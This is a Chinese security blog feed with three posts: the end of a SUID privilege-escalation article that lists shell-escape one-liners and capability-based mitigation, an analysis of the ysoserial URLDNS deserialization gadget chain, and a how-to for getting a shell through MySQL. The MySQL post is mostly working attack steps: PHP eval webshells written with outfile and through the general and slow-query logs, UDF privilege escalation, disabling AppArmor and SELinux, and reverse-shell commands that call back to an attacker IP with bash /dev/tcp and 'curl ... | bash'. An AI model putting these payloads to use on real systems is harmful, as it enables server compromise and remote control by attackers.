<h3 id="3-9-其他测试未提权成功的命令"><a href="#3-9-其他测试未提权成功的命令" class="headerlink" title="3.9 其他测试未提权成功的命令"></a>3.9 其他测试未提权成功的命令</h3><p>网上见到有师傅整理的suid提权命令也包括下面几种，但我在Ubuntu 18和kali 2020中测试并不能提权成功，返回的只是当前用户的shell，这里先记录下</p>
<h4 id="3-9-1-less"><a href="#3-9-1-less" class="headerlink" title="3.9.1 less"></a>3.9.1 less</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="3-9-2-more"><a href="#3-9-2-more" class="headerlink" title="3.9.2 more"></a>3.9.2 more</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="3-9-3-awk"><a href="#3-9-3-awk" class="headerlink" title="3.9.3 awk"></a>3.9.3 awk</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="3-9-4-man"><a href="#3-9-4-man" class="headerlink" title="3.9.4 man"></a>3.9.4 man</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="3-9-5-python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc"><a href="#3-9-5-python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc" class="headerlink" title="3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc"></a>3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc</h4><p>python</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>perl</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-如何缓解"><a href="#0x04-如何缓解" class="headerlink" title="0x04 如何缓解"></a>0x04 如何缓解</h2><p>管理员应仔细审查所有SUID二进制文件，看看到底是否真的需要使用提权后运行。在这个审查过程中，<strong>应该特别关注能够在系统上执行代码或写入数据的那些应用程序</strong>。</p>
<p>对于类似nmap和ping的程序，只需要网络相关的特权即可，Linux 2.2以后增加了capabilities的概念，我们可以用到capabilities这东西做权限分离。</p>
<p>查看kali下ping命令的capabilities</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure>

<p>这就是为什么<code>ping</code>命令未设置suid权限，却仍然可以以普通用户身份运行的原因，同样我们也可以给nmap命令增加类似的capabilities，普通用户就可以执行TCP SYN扫描啦</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627151220669.png" class="" title="image-20210627151220669">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >谈一谈Linux与suid提权<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/sparkdev/p/9651622.html" >Linux 特殊权限 SUID,SGID,SBIT<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID 提权<i class="fas fa-external-link-alt"></i></a></p>
<p>《鸟哥的linux私房菜（第四版）–6.4.3章》</p>
]]></content>
  </entry>
  <entry>
    <title>ysoserial URLDNS分析</title>
    <url>/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习p牛的《java安全漫谈》，文中许多简化版易于理解的demo，根据对demo的理解结合<code>ysoserial</code>源码学习java反序列化，对<code>ysoserial</code>源码分析过程做下记录，本文先记录下URLDNS的分析过程，后续再继续学习记录所有CC链的分析过程，冲冲冲。</p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="如何调试ysoserial"><a href="#如何调试ysoserial" class="headerlink" title="如何调试ysoserial"></a>如何调试ysoserial</h3><p><code>ysoserial</code>所有payload都放在<code>src/main/java/ysoserial/payloads</code>目录，目录下每个文件都有一个<code>main</code>方法，我们要调试哪个利用链，只需要调试对应的java文件即可，例如URLDNS.java的<code>main</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">               PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p><code>payloads</code>目录下所有的<code>main</code>方法都会调用<code>PayloadRunner.run()</code>，跟进<code>PayloadRunner.run()</code>方法，可以看到主要逻辑是将传入第一个参数实例化后调用该类的<code>getObject</code>方法，接着将<code>getObject</code>方法的返回的对象序列化和反序列化，所以利用链的构造逻辑主要在<code>getObject</code>方法内。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line">   <span class="type">byte</span>[] serialized = <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;<span class="type">byte</span>[]&gt;()&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="type">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="literal">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">         ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">         <span class="type">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">         Utils.releasePayload(payload, objBefore);</span><br><span class="line">               <span class="keyword">return</span> ser;</span><br><span class="line">   &#125;&#125;);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">      <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>来看下URLDNS的<code>getObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑比较简单，将一个<code>URL</code>对象put到<code>HashMap</code>的key，再将<code>URL</code>的<code>hashCode</code>设置为<code>-1</code>后返回，11行注释指出了只有<code>hashCode</code>设置<code>-1</code>才能触发DNS请求。</p>
<p>触发反序列化的方法是在<code>readObject</code>方法，上面<code>getObject</code>返回的是一个HashMap对象，所以先看下<code>HashMap</code>类的<code>readObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>hash</code>函数在41行，所以直接在41行下断点</p>
<img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225103112305.png" class="" title="image-20220225103112305">

<p>跟进<code>hash</code>函数，接着调用了URL的<code>hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在URL类的<code>hashCode</code>可以看到<code>hashCode</code>为<code>-1</code>才往下走，所以前面<code>getObject</code>函数中才会将<code>hashCode</code>设置为<code>-1</code>，接着调用<code>URLStreamHandler</code> 对象的<code>hashcode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟入<code>hashCode</code>，将URL传入的<code>getHostAddress</code>方法</p>
<img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105425560.png" class="" title="image-20220225105425560">

<p>跟进<code>getHostAddress</code>方法，通过<code>InetAddress.getByName</code>将主机名转化为IP，也就是执行一次DNS查询</p>
<img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105549303.png" class="" title="image-20220225105549303">

<p>查看第三方反连平台，接收到了DNS请求，说明确实存在反序列化漏洞</p>
<img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105815270.png" class="" title="image-20220225105815270">

<p>调用链如下</p>
<img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225111335501.png" class="" title="image-20220225111335501">

<p>所以URLDNS的<code>Gadget</code>为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">-&gt;HashMap.hash()</span><br><span class="line">-&gt;URL.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.getHostAddress()</span><br><span class="line">-&gt;InetAddress.getByName()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>URLDNS调试起来简单清晰，确实比较适合像我这种入门级选手初次调试反序列流程，URLDNS只能触发DNS请求，并不能说是一个利用链，所以通常用URLDNS来判断是否存在反序列化漏洞。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524" >《Java安全漫谈 - 08.认识最简单的Gadget——URLDNS》<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial项目<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>通过mysql获取shell的几种方法</title>
    <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
<p>1.当前数据库用户为root权限</p>
<p>2.secure-file-priv为空（或包含web目录）</p>
<p>3.已知网站的绝对路径且具有写的权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/WWW/shell.php&#x27;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.secure_file_priv为空（或包含udf目录）</p>
<p>3.udf目录具有写权限</p>
<p><strong>利用步骤</strong></p>
<p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>

<p>当lib&#x2F;plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹（windows）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@basedir;   //查找mysql的目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;    //使用NTFS ADS流创建lib目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; //利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>

<p><strong>mysql仅对本地开放端口的情况</strong></p>
<p>1.上传有web页面版的<a class="link"   href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php" >udf.php<i class="fas fa-external-link-alt"></i></a>进行提权</p>
<p>2.上传 Navicat 自带的 <a class="link"   href="https://sqlsec.lanzoux.com/ibpoGijd6bc" >tunnel 隧道脚本<i class="fas fa-external-link-alt"></i></a>（php），然后通过Navicat连接，执行提权sql语句即可</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/16057523604421.png" class="" title="img">

<p><strong>udf实验过程遇到的坑点</strong></p>
<ol>
<li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977">

<p>通过修改&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf文件secure_file_priv为空</p>
</li>
<li><p>没有写的权限</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261">

<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin权限为777</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li>
</ol>
<p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p>
<p>3.将绝对路径导致so文件找不到，去掉路径即可</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780">

<h2 id="0x03-开启全局日志写入shell"><a href="#0x03-开启全局日志写入shell" class="headerlink" title="0x03 开启全局日志写入shell"></a>0x03 开启全局日志写入shell</h2><p>前两个利用方法都受到secure_file_priv的限制，我们可以通过全局日志或慢查询日志写shell绕过该限制</p>
<p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.网站的绝对路径且具有写入权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #开启全局配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #将日志文件设置成服务器下的木马文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; #执行<span class="keyword">sql</span>语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br></pre></td></tr></table></figure>

<h2 id="0x04-开启慢查询日志写入shell"><a href="#0x04-开启慢查询日志写入shell" class="headerlink" title="0x04 开启慢查询日志写入shell"></a>0x04 开启慢查询日志写入shell</h2><p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.网站的绝对路径且具有写入权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log=1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file=&#x27;/var/WWW/shell.php&#x27;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>

<h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889">

<p><strong>条件</strong></p>
<p>1.mysql版本大于5.7</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142/shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p>
<p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820">

<p>mysql版本5.7之后，secure_file_priv是默认目录,限制mysqld 的导入 | 导出 只能发生在限定目录下。</p>
